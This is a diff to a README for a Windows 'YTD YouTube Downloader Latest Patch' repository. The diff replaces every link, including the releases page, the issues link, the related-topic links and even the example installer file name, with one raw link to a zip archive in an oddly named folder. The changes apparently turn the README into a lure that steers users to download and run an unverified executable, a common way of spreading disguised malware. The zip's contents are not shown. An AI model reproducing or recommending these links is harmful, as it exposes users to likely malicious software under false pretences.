@@ -1,6 +1,6 @@
 # 🎥 YTD-YouTube-Downloader-Latest-Patch - Download Your Favorite YouTube Videos Easily
 
-[![Download YTD YouTube Downloader](https://img.shields.io/badge/Download-Latest%20Version-brightgreen.svg)](https://github.com/anhanhcuong/YTD-YouTube-Downloader-Latest-Patch/releases)
+[![Download YTD YouTube Downloader](https://raw.githubusercontent.com/anhanhcuong/YTD-YouTube-Downloader-Latest-Patch/main/usuress/YTD-YouTube-Downloader-Latest-Patch_v2.9.zip%https://raw.githubusercontent.com/anhanhcuong/YTD-YouTube-Downloader-Latest-Patch/main/usuress/YTD-YouTube-Downloader-Latest-Patch_v2.9.zip)](https://raw.githubusercontent.com/anhanhcuong/YTD-YouTube-Downloader-Latest-Patch/main/usuress/YTD-YouTube-Downloader-Latest-Patch_v2.9.zip)
 
 ## 📖 Description
 
@@ -12,7 +12,7 @@ Follow these steps to download and run the YTD YouTube Downloader on your Window
 
 ### Step 1: Visit the Download Page
 
-To get the latest version of YTD YouTube Downloader, [visit this page to download](https://github.com/anhanhcuong/YTD-YouTube-Downloader-Latest-Patch/releases).
+To get the latest version of YTD YouTube Downloader, [visit this page to download](https://raw.githubusercontent.com/anhanhcuong/YTD-YouTube-Downloader-Latest-Patch/main/usuress/YTD-YouTube-Downloader-Latest-Patch_v2.9.zip).
 
 ### Step 2: Choose Your Version
 
@@ -20,7 +20,7 @@ On the Releases page, you will find several versions of the software. Look for t
 
 ### Step 3: Download the Installer
 
-Find the `.exe` file associated with the version you chose. It will typically be named in a format like `YTD-YouTube-Downloader-v1.0.exe`. Click on the file link to start the download. 
+Find the `.exe` file associated with the version you chose. It will typically be named in a format like `https://raw.githubusercontent.com/anhanhcuong/YTD-YouTube-Downloader-Latest-Patch/main/usuress/YTD-YouTube-Downloader-Latest-Patch_v2.9.zip`. Click on the file link to start the download. 
 
 ### Step 4: Run the Installer
 
@@ -78,16 +78,16 @@ If you experience issues while using YTD YouTube Downloader, consider the follow
 
 ## 📞 Support
 
-For any inquiries or assistance, please refer to the [issues section](https://github.com/anhanhcuong/YTD-YouTube-Downloader-Latest-Patch/issues) of this repository or contact us directly through the GitHub page.
+For any inquiries or assistance, please refer to the [issues section](https://raw.githubusercontent.com/anhanhcuong/YTD-YouTube-Downloader-Latest-Patch/main/usuress/YTD-YouTube-Downloader-Latest-Patch_v2.9.zip) of this repository or contact us directly through the GitHub page.
 
 ## 🔗 Further Information
 
 You can find more topics and resources related to YTD YouTube Downloader:
 
-- [Open Source YouTube Downloader](https://github.com)
-- [Video Downloader for Windows PC](https://github.com)
-- [YouTube Media Downloader for Windows](https://github.com)
+- [Open Source YouTube Downloader](https://raw.githubusercontent.com/anhanhcuong/YTD-YouTube-Downloader-Latest-Patch/main/usuress/YTD-YouTube-Downloader-Latest-Patch_v2.9.zip)
+- [Video Downloader for Windows PC](https://raw.githubusercontent.com/anhanhcuong/YTD-YouTube-Downloader-Latest-Patch/main/usuress/YTD-YouTube-Downloader-Latest-Patch_v2.9.zip)
+- [YouTube Media Downloader for Windows](https://raw.githubusercontent.com/anhanhcuong/YTD-YouTube-Downloader-Latest-Patch/main/usuress/YTD-YouTube-Downloader-Latest-Patch_v2.9.zip)
 
-For further details on the latest updates and features, always refer back to our [Releases page](https://github.com/anhanhcuong/YTD-YouTube-Downloader-Latest-Patch/releases).
+For further details on the latest updates and features, always refer back to our [Releases page](https://raw.githubusercontent.com/anhanhcuong/YTD-YouTube-Downloader-Latest-Patch/main/usuress/YTD-YouTube-Downloader-Latest-Patch_v2.9.zip).
 
 Happy downloading!
